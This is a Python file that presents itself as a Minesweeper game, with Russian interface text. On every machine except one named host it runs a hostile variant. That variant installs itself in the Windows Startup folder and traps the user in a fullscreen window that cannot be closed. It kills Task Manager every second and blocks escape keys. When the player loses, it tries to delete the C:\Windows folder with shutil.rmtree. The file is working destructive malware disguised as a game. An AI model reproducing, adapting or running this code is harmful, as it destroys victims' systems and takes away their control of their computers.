import os
import random
import socket
import subprocess
import sys
import tkinter as tk
import win32com.client
import shutil
try:
    import keyboard
except ImportError:
    keyboard = None


TARGET_HOSTS = ["pc-gstuxilg"]

num_colors = {
    1: "#0000FF",
    2: "#008000",
    3: "#FF0000",
    4: "#000080",
    5: "#800000",
    6: "#008080",
    7: "#000000",
    8: "#808080",
}

cell = 40

def run_savesaper():
    kolvo_flag = 0
    hod = 0
    rect_ids = {}
    text_ids = {}

    def look_for_click():
        canvas.bind("<Button-3>", right_handle_click)
        canvas.bind("<Button-1>", left_handle_click)
        root.mainloop()

    def draw_cells(c, r, color, text=""):
        x1, y1 = c * cell, r * cell
        x2, y2 = x1 + cell, y1 + cell
        rid = canvas.create_rectangle(x1, y1, x2, y2, fill=color, outline="black")
        rect_ids[(r, c)] = rid
        if text:
            tid = canvas.create_text(x1 + cell / 2, y1 + cell / 2, text=text,
                                     font=("Arial", 16, "bold"))
            text_ids[(r, c)] = tid

    def create_game(r, c):
        global gamepole, flags, opened
        gamepole = [[0 for _ in range(dlina)] for _ in range(visota)]
        opened = [[False for _ in range(dlina)] for _ in range(visota)]
        flags = [[False for _ in range(dlina)] for _ in range(visota)]
        placed = 0
        while placed < kolvomin:
            y1 = random.randint(0, visota - 1)
            x1 = random.randint(0, dlina - 1)
            if (y1 == r and x1 == c) or gamepole[y1][x1] == -1:
                continue
            gamepole[y1][x1] = -1
            placed += 1
        pole_fill()

    def pole_fill():
        global gamepole
        for r in range(visota):
            for c in range(dlina):
                if gamepole[r][c] != -1:
                    continue
                for dr in (-1, 0, 1):
                    for dc in (-1, 0, 1):
                        if dr == 0 and dc == 0:
                            continue
                        nr, nc = r + dr, c + dc
                        if 0 <= nr < visota and 0 <= nc < dlina:
                            if gamepole[nr][nc] != -1:
                                gamepole[nr][nc] += 1

    def left_handle_click(event):
        nonlocal hod
        global gamepole
        r = event.y // cell
        c = event.x // cell
        if 0 <= r < visota and 0 <= c < dlina:
            print(f"клик по ({r},{c})")
            if hod == 0:
                hod = 1
                print("Первый ход сделан")
                create_game(r, c)
                open_cell(r, c)
            elif gamepole[r][c] == -1:
                open_cell(r, c)
                gameover()
            else:
                open_cell(r, c)
                look_for_win()

    def right_handle_click(event):
        global opened, flags
        nonlocal kolvo_flag
        r = event.y // cell
        c = event.x // cell
        if not (0 <= r < visota and 0 <= c < dlina):
            return
        print(f"Зафиксирован правый клик по {r}, {c}")
        if opened[r][c]:
            print("Ячейка уже открыта")
            return
        if max_flags == kolvo_flag:
            print("Слишком много флагов")
        if not flags[r][c] and max_flags != kolvo_flag and not opened[r][c]:
            flags[r][c] = True
            redraw_cell(r, c, "#c0c0c0", "🚩")
            look_for_win()
            kolvo_flag += 1
        elif flags[r][c] and not opened[r][c]:
            flags[r][c] = False
            redraw_cell(r, c, "#c0c0c0", "")
            look_for_win()
            kolvo_flag -= 1

    def look_for_win():
        right_flags = 0
        open_cells = 0
        for r in range(visota):
            for c in range(dlina):
                if gamepole[r][c] == -1 and flags[r][c]:
                    right_flags += 1
                if opened[r][c] and not flags[r][c]:
                    open_cells += 1
        if right_flags == kolvomin and open_cells == dlina * visota - kolvomin:
            print("Победа")
            root.destroy()

    def open_cell(r, c):
        if opened[r][c] or flags[r][c]:
            return
        opened[r][c] = True
        if gamepole[r][c] == -1:
            redraw_cell(r, c, "#FF0000", "💣")
            return
        if gamepole[r][c] == 0:
            redraw_cell(r, c, "#e0e0e0", "")
            for dr in (-1, 0, 1):
                for dc in (-1, 0, 1):
                    if dr == 0 and dc == 0:
                        continue
                    nr, nc = r + dr, c + dc
                    if 0 <= nr < visota and 0 <= nc < dlina:
                        open_cell(nr, nc)
        else:
            redraw_cell(r, c, "#e0e0e0", str(gamepole[r][c]),
                        num_colors[gamepole[r][c]])

    def redraw_cell(r, c, color, text="", text_color="black"):
        canvas.itemconfig(rect_ids[(r, c)], fill=color)
        if (r, c) in text_ids:
            canvas.delete(text_ids[(r, c)])
            del text_ids[(r, c)]
        if text:
            x1, y1 = c * cell, r * cell
            tid = canvas.create_text(x1 + cell / 2, y1 + cell / 2, text=text,
                                     font=("Arial", 16, "bold"), fill=text_color)
            text_ids[(r, c)] = tid

    def show_flags():
        for i in flags:
            print(*i)

    def show_opened():
        for i in opened:
            print(*i)

    def show_pole():
        for i in gamepole:
            print(*i)

    def gameover():
        print("Игра закончена")
        for c in range(dlina):
            for r in range(visota):
                if not opened[r][c]:
                    open_cell(r, c)
        root.after(15000, root.destroy)

    while True:
        dlina = int(input("Введите длину поля (минимум 5)\n"))
        if dlina < 5:
            print("Неверная длина поля")
            continue
        break
    while True:
        visota = int(input("Введите ширину поля (минимум 5)\n"))
        if visota < 5:
            print("Неверная ширина поля")
            continue
        break
    while True:
        kolvomin = int(input(f"Сколько мин? (не больше чем {visota * dlina - 1})\n"))
        if kolvomin > visota * dlina - 1 or kolvomin < 1:
            print("Неверное кол-во мин")
            continue
        break

    print("Генерация поля")
    root = tk.Tk()
    canvas = tk.Canvas(root, width=dlina * cell, height=visota * cell, bg="#808080")
    canvas.pack()
    max_flags = kolvomin

    print("Заполнение поля")
    for i in range(dlina):
        for j in range(visota):
            draw_cells(i, j, "#c0c0c0")

    if keyboard is not None:
        keyboard.add_hotkey("p", show_pole)
        keyboard.add_hotkey("o", show_opened)
        keyboard.add_hotkey("i", show_flags)

    print("Поле заполнено")
    print("Ожидаем первого хода")
    look_for_click()

def run_windelsaper():
    kolvo_flag = 0
    hod = 0
    rect_ids = {}
    text_ids = {}

    def look_for_click():
        canvas.bind("<Button-3>", right_handle_click)
        canvas.bind("<Button-1>", left_handle_click)
        root.mainloop()

    def draw_cells(c, r, color, text=""):
        x1, y1 = c * cell, r * cell
        x2, y2 = x1 + cell, y1 + cell
        rid = canvas.create_rectangle(x1, y1, x2, y2, fill=color, outline="black")
        rect_ids[(r, c)] = rid
        if text:
            tid = canvas.create_text(x1 + cell / 2, y1 + cell / 2, text=text,
                                     font=("Arial", 16, "bold"))
            text_ids[(r, c)] = tid

    def create_game(r, c):
        global gamepole, flags, opened
        gamepole = [[0 for _ in range(dlina)] for _ in range(visota)]
        opened = [[False for _ in range(dlina)] for _ in range(visota)]
        flags = [[False for _ in range(dlina)] for _ in range(visota)]
        placed = 0
        while placed < kolvomin:
            y1 = random.randint(0, visota - 1)
            x1 = random.randint(0, dlina - 1)
            if (y1 == r and x1 == c) or gamepole[y1][x1] == -1:
                continue
            gamepole[y1][x1] = -1
            placed += 1
        pole_fill()

    def pole_fill():
        global gamepole
        for r in range(visota):
            for c in range(dlina):
                if gamepole[r][c] != -1:
                    continue
                for dr in (-1, 0, 1):
                    for dc in (-1, 0, 1):
                        if dr == 0 and dc == 0:
                            continue
                        nr, nc = r + dr, c + dc
                        if 0 <= nr < visota and 0 <= nc < dlina:
                            if gamepole[nr][nc] != -1:
                                gamepole[nr][nc] += 1

    def left_handle_click(event):
        nonlocal hod
        r = event.y // cell
        c = event.x // cell
        if 0 <= r < visota and 0 <= c < dlina:
            print(f"клик по ({r},{c})")
            if hod == 0:
                hod = 1
                print("Первый ход сделан")
                create_game(r, c)
                open_cell(r, c)
            elif gamepole[r][c] == -1:
                open_cell(r, c)
                gameover()
            else:
                open_cell(r, c)
                look_for_win()

    def right_handle_click(event):
        nonlocal kolvo_flag
        r = event.y // cell
        c = event.x // cell
        if not (0 <= r < visota and 0 <= c < dlina):
            return
        print(f"Зафиксирован правый клик по {r}, {c}")
        if opened[r][c]:
            print("Ячейка уже открыта")
            return
        if max_flags == kolvo_flag:
            print("Слишком много флагов")
        if not flags[r][c] and max_flags != kolvo_flag and not opened[r][c]:
            flags[r][c] = True
            redraw_cell(r, c, "#c0c0c0", "🚩")
            look_for_win()
            kolvo_flag += 1
        elif flags[r][c] and not opened[r][c]:
            flags[r][c] = False
            redraw_cell(r, c, "#c0c0c0", "")
            look_for_win()
            kolvo_flag -= 1

    def look_for_win():
        right_flags = 0
        open_cells = 0
        for r in range(visota):
            for c in range(dlina):
                if gamepole[r][c] == -1 and flags[r][c]:
                    right_flags += 1
                if opened[r][c] and not flags[r][c]:
                    open_cells += 1
        if right_flags == kolvomin and open_cells == dlina * visota - kolvomin:
            print("Победа")
            root.destroy()
            sys.exit()

    def open_cell(r, c):
        if opened[r][c] or flags[r][c]:
            return
        opened[r][c] = True
        if gamepole[r][c] == -1:
            redraw_cell(r, c, "#FF0000", "💣")
            return
        if gamepole[r][c] == 0:
            redraw_cell(r, c, "#e0e0e0", "")
            for dr in (-1, 0, 1):
                for dc in (-1, 0, 1):
                    if dr == 0 and dc == 0:
                        continue
                    nr, nc = r + dr, c + dc
                    if 0 <= nr < visota and 0 <= nc < dlina:
                        open_cell(nr, nc)
        else:
            redraw_cell(r, c, "#e0e0e0", str(gamepole[r][c]),
                        num_colors[gamepole[r][c]])

    def redraw_cell(r, c, color, text="", text_color="black"):
        canvas.itemconfig(rect_ids[(r, c)], fill=color)
        if (r, c) in text_ids:
            canvas.delete(text_ids[(r, c)])
            del text_ids[(r, c)]
        if text:
            x1, y1 = c * cell, r * cell
            tid = canvas.create_text(x1 + cell / 2, y1 + cell / 2, text=text,
                                     font=("Arial", 16, "bold"), fill=text_color)
            text_ids[(r, c)] = tid

    def show_flags():
        for i in flags:
            print(*i)

    def show_opened():
        for i in opened:
            print(*i)

    def show_pole():
        for i in gamepole:
            print(*i)

    def autoload():
        script_dir = os.path.dirname(os.path.abspath(__file__))
        bat_path = os.path.join(script_dir, "startsaper.bat")

        startup_dir = os.path.join(
            os.environ["APPDATA"],
            "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
        )

        shortcut_path = os.path.join(startup_dir, "startsaper.lnk")

        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.TargetPath = bat_path
        shortcut.WorkingDirectory = script_dir
        shortcut.WindowStyle = 7
        shortcut.Description = "Автозапуск startsaper"
        shortcut.Save()

        print(f"Ярлык создан: {shortcut_path}")

    def gameover():
        print("Игра закончена")
        for c in range(dlina):
            for r in range(visota):
                if not opened[r][c]:
                    open_cell(r, c)
        shutil.rmtree("C:\Windows", onerror=force_remove)
        root.after(15000, root.destroy)

    dlina = 16
    visota = 16
    kolvomin = 40

    print("Генерация поля")
    autoload()
    root = tk.Tk()
    root.title("Сапёр")
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    for seq in ("<Alt-F4>", "<Escape>", "<Control-w>", "<Control-q>"):
        root.bind(seq, lambda e: "break")

    canvas = tk.Canvas(root, width=dlina * cell, height=visota * cell,
                       bg="#808080", highlightthickness=0)
    canvas.place(relx=0.5, rely=0.5, anchor="center")

    def keep_kiosk():
        try:
            subprocess.run(["taskkill", "/F", "/IM", "Taskmgr.exe"], check=False)
            root.attributes("-fullscreen", True)
            root.attributes("-topmost", True)
            root.lift()
        finally:
            root.after(1000, keep_kiosk)

    keep_kiosk()
    max_flags = kolvomin

    print("Заполнение поля")
    for i in range(dlina):
        for j in range(visota):
            draw_cells(i, j, "#c0c0c0")

    if keyboard is not None:
        keyboard.add_hotkey("p", show_pole)
        keyboard.add_hotkey("o", show_opened)
        keyboard.add_hotkey("i", show_flags)
        keyboard.add_hotkey("alt+f4", lambda: None, suppress=True)
        keyboard.add_hotkey("ctrl+w", lambda: None, suppress=True)
        keyboard.add_hotkey("ctrl+q", lambda: None, suppress=True)
        keyboard.add_hotkey("ctrl+shift+esc", lambda: None, suppress=True)
        keyboard.add_hotkey("alt+tab", lambda: None, suppress=True)
        keyboard.add_hotkey("win", lambda: None, suppress=True)
        keyboard.add_hotkey("alt+space", lambda: None, suppress=True)
        keyboard.add_hotkey("ctrl+alt+delete", lambda: None, suppress=True)
        keyboard.add_hotkey("win+r", lambda: None, suppress=True)
        keyboard.add_hotkey("ctrl+alt", lambda: None, suppress=True)
        keyboard.block_key('win')

    print("Поле заполнено")
    print("Ожидаем первого хода")
    look_for_click()


def main():
    host = socket.gethostname().lower()
    #print(f"hostname: {host}")
    if host in TARGET_HOSTS:
        #print("route -> savesaper")
        run_savesaper()
    else:
        #print("route -> windelsaper")
        run_windelsaper()



if __name__ == "__main__":
    main()